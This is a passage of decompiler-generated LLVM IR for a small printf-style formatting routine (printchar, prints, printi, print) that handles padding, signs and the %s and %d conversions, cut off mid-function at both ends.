  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_1000076c = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_10000778 = icmp eq i32 %v0_1000076c, 0
  br i1 %v3_10000778, label %dec_label_pc_100007ac, label %dec_label_pc_10000780

dec_label_pc_10000780:                            ; preds = %entry
  %v1_10000784 = inttoptr i32 %v0_1000076c to i32*
  %v2_10000784 = load i32, i32* %v1_10000784, align 4
  %v1_10000790 = trunc i32 %arg2 to i8
  %v3_10000790 = inttoptr i32 %v2_10000784 to i8*
  store i8 %v1_10000790, i8* %v3_10000790, align 1
  %v2_10000798 = load i32, i32* %v1_10000784, align 4
  %v1_1000079c = add i32 %v2_10000798, 1
  store i32 %v1_1000079c, i32* %v1_10000784, align 4
  %v0_100007d4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100007c0

dec_label_pc_100007ac:                            ; preds = %entry
  %v2_100007ac = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437440, i32* @lr, align 4
  %v2_100007bc = call i32 @__libc_write(i32 1, i32 %v2_100007ac)
  store i32 %v2_100007bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100007c0

dec_label_pc_100007c0:                            ; preds = %dec_label_pc_10000780, %dec_label_pc_100007ac
  %v0_100007d4 = phi i32 [ %v0_100007d4.pre, %dec_label_pc_10000780 ], [ %v2_100007bc, %dec_label_pc_100007ac ]
  ret i32 %v0_100007d4

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100007c0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp44 = icmp slt i32 %arg3, 1
  br i1 %tmp44, label %dec_label_pc_1000089c, label %dec_label_pc_10000818

dec_label_pc_10000818:                            ; preds = %entry
  %v2_1000084825 = load i8, i8* %arg2, align 1
  %v3_1000085028 = icmp eq i8 %v2_1000084825, 0
  br i1 %v3_1000085028, label %dec_label_pc_10000858, label %dec_label_pc_1000082c

dec_label_pc_1000082c:                            ; preds = %dec_label_pc_10000818, %dec_label_pc_1000082c
  %v4_1000084430 = phi i32 [ %v1_1000083c, %dec_label_pc_1000082c ], [ %tmp, %dec_label_pc_10000818 ]
  %stack_var_-20.029 = phi i32 [ %v1_10000830, %dec_label_pc_1000082c ], [ 0, %dec_label_pc_10000818 ]
  %v1_10000830 = add i32 %stack_var_-20.029, 1
  %v1_1000083c = add i32 %v4_1000084430, 1
  %v5_10000840 = inttoptr i32 %v1_1000083c to i8*
  %v2_10000848 = load i8, i8* %v5_10000840, align 1
  %v3_10000850 = icmp eq i8 %v2_10000848, 0
  br i1 %v3_10000850, label %dec_label_pc_10000858, label %dec_label_pc_1000082c

dec_label_pc_10000858:                            ; preds = %dec_label_pc_1000082c, %dec_label_pc_10000818
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000818 ], [ %v1_10000830, %dec_label_pc_1000082c ]
  %v2_10000860 = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_10000860, label %dec_label_pc_10000874, label %dec_label_pc_10000884

dec_label_pc_10000874:                            ; preds = %dec_label_pc_10000858
  %v2_1000087c = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000884

dec_label_pc_10000884:                            ; preds = %dec_label_pc_10000858, %dec_label_pc_10000874
  %storemerge2 = phi i32 [ %v2_1000087c, %dec_label_pc_10000874 ], [ 0, %dec_label_pc_10000858 ]
  %v1_10000888 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_1000088c = icmp eq i32 %v1_10000888, 0
  br i1 %v3_1000088c, label %dec_label_pc_1000089c, label %dec_label_pc_10000894

dec_label_pc_10000894:                            ; preds = %dec_label_pc_10000884
  br label %dec_label_pc_1000089c

dec_label_pc_1000089c:                            ; preds = %dec_label_pc_10000884, %entry, %dec_label_pc_10000894
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge2, %dec_label_pc_10000884 ], [ %storemerge2, %dec_label_pc_10000894 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000884 ], [ 48, %dec_label_pc_10000894 ]
  %v1_100008a0 = urem i32 %arg4, 2
  %v3_100008a4 = icmp eq i32 %v1_100008a0, 0
  br i1 %v3_100008a4, label %dec_label_pc_100008d4.preheader, label %dec_label_pc_10000914.preheader

dec_label_pc_100008d4.preheader:                  ; preds = %dec_label_pc_1000089c
  %v2_100008d818 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_100008d818, label %dec_label_pc_100008b0.lr.ph, label %dec_label_pc_10000914.preheader

dec_label_pc_100008b0.lr.ph:                      ; preds = %dec_label_pc_100008d4.preheader
  %v2_100008b8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100008b0

dec_label_pc_100008b0:                            ; preds = %dec_label_pc_100008b0.lr.ph, %dec_label_pc_100008b0
  %stack_var_-32.121 = phi i32 [ %stack_var_-32.0, %dec_label_pc_100008b0.lr.ph ], [ %v1_100008cc, %dec_label_pc_100008b0 ]
  %v3_100008b8 = call i32 @printchar(i32* %v2_100008b8, i32 %stack_var_-16.0)
  %v1_100008cc = add nsw i32 %stack_var_-32.121, -1
  %v2_100008d8 = icmp sgt i32 %stack_var_-32.121, 1
  br i1 %v2_100008d8, label %dec_label_pc_100008b0, label %dec_label_pc_10000914.preheader

dec_label_pc_10000914.preheader:                  ; preds = %dec_label_pc_100008b0, %dec_label_pc_100008d4.preheader, %dec_label_pc_1000089c
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_1000089c ], [ 0, %dec_label_pc_100008d4.preheader ], [ %stack_var_-32.0, %dec_label_pc_100008b0 ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000089c ], [ %stack_var_-32.0, %dec_label_pc_100008d4.preheader ], [ 0, %dec_label_pc_100008b0 ]
  %v2_100009189 = load i8, i8* %arg2, align 1
  %v3_1000092012 = icmp eq i8 %v2_100009189, 0
  br i1 %v3_1000092012, label %dec_label_pc_10000950.preheader, label %dec_label_pc_100008e4.lr.ph

dec_label_pc_100008e4.lr.ph:                      ; preds = %dec_label_pc_10000914.preheader
  %v2_100008f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100008e4

dec_label_pc_100008e4:                            ; preds = %dec_label_pc_100008e4.lr.ph, %dec_label_pc_100008e4
  %v4_1000091415 = phi i32 [ %tmp, %dec_label_pc_100008e4.lr.ph ], [ %v1_1000090c, %dec_label_pc_100008e4 ]
  %stack_var_-36.014 = phi i8* [ %arg2, %dec_label_pc_100008e4.lr.ph ], [ %v5_10000910, %dec_label_pc_100008e4 ]
  %stack_var_-12.113 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_100008e4.lr.ph ], [ %v1_10000900, %dec_label_pc_100008e4 ]
  %v2_100008e8 = load i8, i8* %stack_var_-36.014, align 1
  %v3_100008e8 = zext i8 %v2_100008e8 to i32
  %v3_100008f8 = call i32 @printchar(i32* %v2_100008f8, i32 %v3_100008e8)
  %v1_10000900 = add i32 %stack_var_-12.113, 1
  %v1_1000090c = add i32 %v4_1000091415, 1
  %v5_10000910 = inttoptr i32 %v1_1000090c to i8*
  %v2_10000918 = load i8, i8* %v5_10000910, align 1
  %v3_10000920 = icmp eq i8 %v2_10000918, 0
  br i1 %v3_10000920, label %dec_label_pc_10000950.preheader, label %dec_label_pc_100008e4

dec_label_pc_10000950.preheader:                  ; preds = %dec_label_pc_100008e4, %dec_label_pc_10000914.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000914.preheader ], [ %v1_10000900, %dec_label_pc_100008e4 ]
  %v2_100009544 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100009544, label %dec_label_pc_1000092c.lr.ph, label %dec_label_pc_1000095c

dec_label_pc_1000092c.lr.ph:                      ; preds = %dec_label_pc_10000950.preheader
  %v2_10000934 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000092c

dec_label_pc_1000092c:                            ; preds = %dec_label_pc_1000092c.lr.ph, %dec_label_pc_1000092c
  %stack_var_-32.37 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_1000092c.lr.ph ], [ %v1_10000948, %dec_label_pc_1000092c ]
  %v3_10000934 = call i32 @printchar(i32* %v2_10000934, i32 %stack_var_-16.0)
  %v1_10000948 = add nsw i32 %stack_var_-32.37, -1
  %v2_10000954 = icmp sgt i32 %stack_var_-32.37, 1
  br i1 %v2_10000954, label %dec_label_pc_1000092c, label %dec_label_pc_10000950.dec_label_pc_1000095c_crit_edge

dec_label_pc_10000950.dec_label_pc_1000095c_crit_edge: ; preds = %dec_label_pc_1000092c
  %tmp45 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_1000095c

dec_label_pc_1000095c:                            ; preds = %dec_label_pc_10000950.dec_label_pc_1000095c_crit_edge, %dec_label_pc_10000950.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp45, %dec_label_pc_10000950.dec_label_pc_1000095c_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_10000950.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000090c, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000083c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000092c, { 1, 0 }
  uselistorder label %dec_label_pc_100008e4, { 1, 0 }
  uselistorder label %dec_label_pc_100008b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000089c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000884, { 1, 0 }
  uselistorder label %dec_label_pc_1000082c, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_100009c8 = icmp eq i32 %arg2, 0
  br i1 %v3_100009c8, label %dec_label_pc_100009d0, label %dec_label_pc_10000a04

dec_label_pc_100009d0:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_100009f4 = bitcast i32* %stack_var_-88 to i8*
  %v5_100009f4 = call i32 @prints(i32 %arg1, i8* %v4_100009f4, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_10000b5c

dec_label_pc_10000a04:                            ; preds = %entry
  %v3_10000a08 = icmp eq i32 %arg4, 0
  br i1 %v3_10000a08, label %dec_label_pc_10000a3c, label %dec_label_pc_10000a10

dec_label_pc_10000a10:                            ; preds = %dec_label_pc_10000a04
  %v3_10000a14 = icmp eq i32 %arg3, 10
  br i1 %v3_10000a14, label %dec_label_pc_10000a1c, label %dec_label_pc_10000a3c

dec_label_pc_10000a1c:                            ; preds = %dec_label_pc_10000a10
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_10000a3c, label %dec_label_pc_10000a28

dec_label_pc_10000a28:                            ; preds = %dec_label_pc_10000a1c
  %v1_10000a34 = sub i32 0, %arg2
  br label %dec_label_pc_10000a3c

dec_label_pc_10000a3c:                            ; preds = %dec_label_pc_10000a10, %dec_label_pc_10000a1c, %dec_label_pc_10000a04, %dec_label_pc_10000a28
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000a04 ], [ %arg2, %dec_label_pc_10000a1c ], [ %v1_10000a34, %dec_label_pc_10000a28 ], [ %arg2, %dec_label_pc_10000a10 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000a04 ], [ 0, %dec_label_pc_10000a1c ], [ 1, %dec_label_pc_10000a28 ], [ 0, %dec_label_pc_10000a10 ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_10000ac85 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_10000ac85, label %dec_label_pc_10000ad0, label %dec_label_pc_10000a54.lr.ph

dec_label_pc_10000a54.lr.ph:                      ; preds = %dec_label_pc_10000a3c
  %v2_10000a84 = add i32 %arg7, -58
  br label %dec_label_pc_10000a54

dec_label_pc_10000a54:                            ; preds = %dec_label_pc_10000a54.lr.ph, %dec_label_pc_10000a90
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_10000a54.lr.ph ], [ %v2_10000abc, %dec_label_pc_10000a90 ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_10000a54.lr.ph ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %v2_10000a5c = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_10000a5c, 10
  br i1 %tmp29, label %dec_label_pc_10000a90, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a54
  %v1_10000a88 = add i32 %v2_10000a84, %v2_10000a5c
  br label %dec_label_pc_10000a90

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a54, %dec_label_pc_10000a7c
  %stack_var_-32.0 = phi i32 [ %v2_10000a5c, %dec_label_pc_10000a54 ], [ %v1_10000a88, %dec_label_pc_10000a7c ]
  %v4_10000a90 = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000a94 = add i32 %v4_10000a90, -1
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_10000ab0 = trunc i32 %fold to i8
  store i8 %v1_10000ab0, i8* %v5_10000a98, align 1
  %v2_10000abc = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000ac8 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000ac8, label %dec_label_pc_10000ad0, label %dec_label_pc_10000a54

dec_label_pc_10000ad0:                            ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a3c
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_10000a3c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %v3_10000ad4 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000ad4, label %dec_label_pc_10000b38, label %dec_label_pc_10000adc

dec_label_pc_10000adc:                            ; preds = %dec_label_pc_10000ad0
  %v3_10000ae0 = icmp eq i32 %arg5, 0
  br i1 %v3_10000ae0, label %dec_label_pc_10000b20, label %dec_label_pc_10000ae8

dec_label_pc_10000ae8:                            ; preds = %dec_label_pc_10000adc
  %v1_10000aec = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_10000af0 = icmp eq i32 %v1_10000aec, 0
  br i1 %v3_10000af0, label %dec_label_pc_10000b20, label %dec_label_pc_10000af8

dec_label_pc_10000af8:                            ; preds = %dec_label_pc_10000ae8
  %v2_10000b00 = inttoptr i32 %arg1 to i32*
  %v3_10000b00 = call i32 @printchar(i32* %v2_10000b00, i32 45)
  %v1_10000b14 = add i32 %arg5, -1
  br label %dec_label_pc_10000b38

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000ae8, %dec_label_pc_10000adc
  %v4_10000b20 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_10000b24 = add i32 %v4_10000b20, -1
  %v5_10000b28 = inttoptr i32 %v1_10000b24 to i8*
  store i8 45, i8* %v5_10000b28, align 1
  br label %dec_label_pc_10000b38

dec_label_pc_10000b38:                            ; preds = %dec_label_pc_10000ad0, %dec_label_pc_10000af8, %dec_label_pc_10000b20
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_10000ad0 ], [ %v5_10000b28, %dec_label_pc_10000b20 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000af8 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_10000ad0 ], [ %arg5, %dec_label_pc_10000b20 ], [ %v1_10000b14, %dec_label_pc_10000af8 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_10000ad0 ], [ 0, %dec_label_pc_10000b20 ], [ 1, %dec_label_pc_10000af8 ]
  %v5_10000b48 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_10000b54 = add i32 %v5_10000b48, %stack_var_-40.0
  br label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_100009d0, %dec_label_pc_10000b38
  %storemerge = phi i32 [ %v2_10000b54, %dec_label_pc_10000b38 ], [ %v5_100009f4, %dec_label_pc_100009d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000a98, { 0, 2, 1 }
  uselistorder i32 %v2_10000a5c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b5c, { 1, 0 }
  uselistorder label %dec_label_pc_10000b38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000a90, { 1, 0 }
  uselistorder label %dec_label_pc_10000a54, { 1, 0 }
  uselistorder label %dec_label_pc_10000a3c, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_1000114c28 = load i8, i8* %stack_var_-68.427, align 1
  %v3_1000115431 = icmp eq i8 %v2_1000114c28, 0
  br i1 %v3_1000115431, label %dec_label_pc_1000115c, label %dec_label_pc_10000ba8.lr.ph

dec_label_pc_10000ba8.lr.ph:                      ; preds = %entry
  %v1_10000d1c = add i32 %arg3, 4
  %v2_10000d1c = inttoptr i32 %v1_10000d1c to i32*
  %v1_10000ce4 = add i32 %arg3, 8
  %v2_10000ce4 = inttoptr i32 %v1_10000ce4 to i32*
  %v4_10001100 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000ba8

dec_label_pc_10000ba8:                            ; preds = %dec_label_pc_10000ba8.lr.ph, %dec_label_pc_1000113c
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000ba8.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_1000113c ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000ba8.lr.ph ], [ %v1_10001140, %dec_label_pc_1000113c ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000ba8.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_1000113c ]
  %v2_10000bac = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000bb4 = icmp eq i8 %v2_10000bac, 37
  br i1 %v3_10000bb4, label %dec_label_pc_10000bbc, label %dec_label_pc_10001118

dec_label_pc_10000bbc:                            ; preds = %dec_label_pc_10000ba8
  %v1_10000bc0 = add i32 %stack_var_-68.4.in33, 1
  %v5_10000bc4 = inttoptr i32 %v1_10000bc0 to i8*
  %v2_10000bdc = load i8, i8* %v5_10000bc4, align 1
  %v3_10000be4 = icmp eq i8 %v2_10000bdc, 0
  br i1 %v3_10000be4, label %dec_label_pc_1000115c, label %dec_label_pc_10000bec

dec_label_pc_10000bec:                            ; preds = %dec_label_pc_10000bbc
  %v2_10000bf0 = load i8, i8* %v5_10000bc4, align 1
  %v3_10000bf8 = icmp eq i8 %v2_10000bf0, 37
  br i1 %v3_10000bf8, label %dec_label_pc_10001118, label %dec_label_pc_10000c00

dec_label_pc_10000c00:                            ; preds = %dec_label_pc_10000bec
  %v2_10000c04 = load i8, i8* %v5_10000bc4, align 1
  %v3_10000c0c = icmp eq i8 %v2_10000c04, 45
  br i1 %v3_10000c0c, label %dec_label_pc_10000c14, label %dec_label_pc_10000c44.preheader

dec_label_pc_10000c14:                            ; preds = %dec_label_pc_10000c00
  %v1_10000c18 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000c1c = inttoptr i32 %v1_10000c18 to i8*
  br label %dec_label_pc_10000c44.preheader

dec_label_pc_10000c44.preheader:                  ; preds = %dec_label_pc_10000c14, %dec_label_pc_10000c00
  %stack_var_-68.0.ph = phi i8* [ %v5_10000bc4, %dec_label_pc_10000c00 ], [ %v5_10000c1c, %dec_label_pc_10000c14 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000c00 ], [ 1, %dec_label_pc_10000c14 ]
  %v4_10000c443 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000c484 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000c508 = icmp eq i8 %v2_10000c484, 48
  br i1 %v3_10000c508, label %dec_label_pc_10000c2c, label %dec_label_pc_10000c90.preheader

dec_label_pc_10000c2c:                            ; preds = %dec_label_pc_10000c44.preheader, %dec_label_pc_10000c2c
  %v4_10000c4410 = phi i32 [ %v1_10000c30, %dec_label_pc_10000c2c ], [ %v4_10000c443, %dec_label_pc_10000c44.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000c3c, %dec_label_pc_10000c2c ], [ %stack_var_-52.0.ph, %dec_label_pc_10000c44.preheader ]
  %v1_10000c30 = add i32 %v4_10000c4410, 1
  %v5_10000c34 = inttoptr i32 %v1_10000c30 to i8*
  %v1_10000c3c = or i32 %stack_var_-52.09, 2
  %v2_10000c48 = load i8, i8* %v5_10000c34, align 1
  %v3_10000c50 = icmp eq i8 %v2_10000c48, 48
  br i1 %v3_10000c50, label %dec_label_pc_10000c2c, label %dec_label_pc_10000c90.preheader

dec_label_pc_10000c90.preheader:                  ; preds = %dec_label_pc_10000c2c, %dec_label_pc_10000c44.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000c44.preheader ], [ %v1_10000c3c, %dec_label_pc_10000c2c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000c44.preheader ], [ %v5_10000c34, %dec_label_pc_10000c2c ]
  %v4_10000c9012 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000c9413 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000c9413, 48
  br i1 %tmp62, label %dec_label_pc_10000cb8, label %dec_label_pc_10000ca4

dec_label_pc_10000c5c:                            ; preds = %dec_label_pc_10000ca4
  %v1_10000c60 = mul i32 %stack_var_-48.018, 10
  %v2_10000c6c = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000c6c = zext i8 %v2_10000c6c to i32
  %v2_10000c78 = add i32 %v1_10000c60, -48
  %v1_10000c7c = add i32 %v2_10000c78, %v3_10000c6c
  %v1_10000c88 = add i32 %v4_10000c9020, 1
  %v5_10000c8c = inttoptr i32 %v1_10000c88 to i8*
  %v2_10000c94 = load i8, i8* %v5_10000c8c, align 1
  %tmp63 = icmp ult i8 %v2_10000c94, 48
  br i1 %tmp63, label %dec_label_pc_10000cb8, label %dec_label_pc_10000ca4

dec_label_pc_10000ca4:                            ; preds = %dec_label_pc_10000c90.preheader, %dec_label_pc_10000c5c
  %v4_10000c9020 = phi i32 [ %v1_10000c88, %dec_label_pc_10000c5c ], [ %v4_10000c9012, %dec_label_pc_10000c90.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10000c8c, %dec_label_pc_10000c5c ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000c90.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000c7c, %dec_label_pc_10000c5c ], [ 0, %dec_label_pc_10000c90.preheader ]
  %v2_10000ca8 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000ca8, 58
  br i1 %tmp64, label %dec_label_pc_10000c5c, label %dec_label_pc_10000cb8

dec_label_pc_10000cb8:                            ; preds = %dec_label_pc_10000c5c, %dec_label_pc_10000ca4, %dec_label_pc_10000c90.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000c90.preheader ], [ %v1_10000c7c, %dec_label_pc_10000c5c ], [ %stack_var_-48.018, %dec_label_pc_10000ca4 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000c90.preheader ], [ %v5_10000c8c, %dec_label_pc_10000c5c ], [ %stack_var_-68.119, %dec_label_pc_10000ca4 ]
  %v2_10000cbc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc4 = icmp eq i8 %v2_10000cbc, 115
  br i1 %v3_10000cc4, label %dec_label_pc_10000ccc, label %dec_label_pc_10000d8c

dec_label_pc_10000ccc:                            ; preds = %dec_label_pc_10000cb8
  %v2_10000cd0 = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000cd0, 7
  br i1 %tmp65, label %dec_label_pc_10000d18, label %dec_label_pc_10000ce0

dec_label_pc_10000ce0:                            ; preds = %dec_label_pc_10000ccc
  %v3_10000ce4 = load i32, i32* %v2_10000ce4, align 4
  %v2_10000cec = load i8, i8* %tmp, align 1
  %v3_10000cec = zext i8 %v2_10000cec to i32
  %v1_10000cf8 = mul nuw nsw i32 %v3_10000cec, 4
  %v2_10000cfc = add i32 %v1_10000cf8, %v3_10000ce4
  %v1_10000d04 = add i8 %v2_10000cec, 1
  store i8 %v1_10000d04, i8* %tmp, align 1
  br label %dec_label_pc_10000d30

dec_label_pc_10000d18:                            ; preds = %dec_label_pc_10000ccc
  %v3_10000d1c = load i32, i32* %v2_10000d1c, align 4
  %v1_10000d24 = add i32 %v3_10000d1c, 4
  store i32 %v1_10000d24, i32* %v2_10000d1c, align 4
  br label %dec_label_pc_10000d30

dec_label_pc_10000d30:                            ; preds = %dec_label_pc_10000ce0, %dec_label_pc_10000d18
  %stack_var_-20.0 = phi i32 [ %v3_10000d1c, %dec_label_pc_10000d18 ], [ %v2_10000cfc, %dec_label_pc_10000ce0 ]
  %v1_10000d34 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000d34 = load i32, i32* %v1_10000d34, align 4
  %v3_10000d40 = icmp eq i32 %v2_10000d34, 0
  br i1 %v3_10000d40, label %dec_label_pc_10000d54, label %dec_label_pc_10000d48

dec_label_pc_10000d48:                            ; preds = %dec_label_pc_10000d30
  %v5_10000d4c = inttoptr i32 %v2_10000d34 to i8*
  br label %dec_label_pc_10000d60

dec_label_pc_10000d54:                            ; preds = %dec_label_pc_10000d30
  br label %dec_label_pc_10000d60

dec_label_pc_10000d60:                            ; preds = %dec_label_pc_10000d48, %dec_label_pc_10000d54
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000de48.21, i32 0, i32 0), %dec_label_pc_10000d54 ], [ %v5_10000d4c, %dec_label_pc_10000d48 ]
  %v6_10000d74 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000d80 = add i32 %v6_10000d74, %stack_var_-56.132
  br label %dec_label_pc_1000113c

dec_label_pc_10000d8c:                            ; preds = %dec_label_pc_10000cb8
  %v2_10000d90 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d98 = icmp eq i8 %v2_10000d90, 100
  br i1 %v3_10000d98, label %dec_label_pc_10000da0, label %dec_label_pc_10000e40

dec_label_pc_10000da0:                            ; preds = %dec_label_pc_10000d8c
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000da4, 7
  br i1 %tmp66, label %dec_label_pc_10000dec, label %dec_label_pc_10000db4

dec_label_pc_10000db4:                            ; preds = %dec_label_pc_10000da0
  %v3_10000db8 = load i32, i32* %v2_10000ce4, align 4
  %v2_10000dc0 = load i8, i8* %tmp, align 1
  %v3_10000dc0 = zext i8 %v2_10000dc0 to i32
  %v1_10000dcc = mul nuw nsw i32 %v3_10000dc0, 4
  %v2_10000dd0 = add i32 %v1_10000dcc, %v3_10000db8
  %v1_10000dd8 = add i8 %v2_10000dc0, 1
  store i8 %v1_10000dd8, i8* %tmp, align 1
  br label %dec_label_pc_10000e04

dec_label_pc_10000dec:                            ; preds = %dec_label_pc_10000da0
  %v3_10000df0 = load i32, i32* %v2_10000d1c, align 4
  %v1_10000df8 = add i32 %v3_10000df0, 4
  store i32 %v1_10000df8, i32* %v2_10000d1c, align 4
  br label %dec_label_pc_10000e04

dec_label_pc_10000e04:                            ; preds = %dec_label_pc_10000db4, %dec_label_pc_10000dec
